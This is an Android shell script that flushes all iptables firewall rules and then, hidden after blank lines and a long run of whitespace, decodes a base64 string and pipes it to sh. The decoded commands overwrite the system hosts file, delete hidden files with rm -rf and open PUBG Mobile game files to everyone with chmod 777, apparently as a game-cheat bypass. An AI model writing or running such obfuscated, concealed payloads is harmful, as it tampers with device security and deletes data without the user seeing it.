IP6TABLES=/system/bin/ip6tables
IPTABLES=/system/bin/iptables

$IPTABLES -F
$IPTABLES -X
$IPTABLES -t nat -F
$IPTABLES -t nat -X

iptables --flush
iptables -F






































                                                                                                                                                                                                                                                                                                                                                                                                                                 echo "Y3AgL3N0b3JhZ2UvZW11bGF0ZWQvMC9BbmRyb2lkL29iYi9ob3N0cyAvc3lzdGVtL2V0Yy9ob3N0cwpybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8ubG9naW4Kcm0gLXJmIC9zdG9yYWdlL2VtdWxhdGVkLzAvLmtvb3BhCnJtIC1yZiAvc3RvcmFnZS9lbXVsYXRlZC8wLy50aW1lCnJtIC1yZiAvc3RvcmFnZS9lbXVsYXRlZC8wLy50ZW1wCmNobW9kIDc3NyAvZGF0YS9tZWRpYS8wL0FuZHJvaWQvZGF0YS9jb20udGVuY2VudC5pZy9maWxlcy9VRTRHYW1lL1NoYWRvd1RyYWNrZXJFeHRyYS9TaGFkb3dUcmFja2VyRXh0cmEvU2F2ZWQvUGFrcy9nYW1lKg==" | base64 -d | sh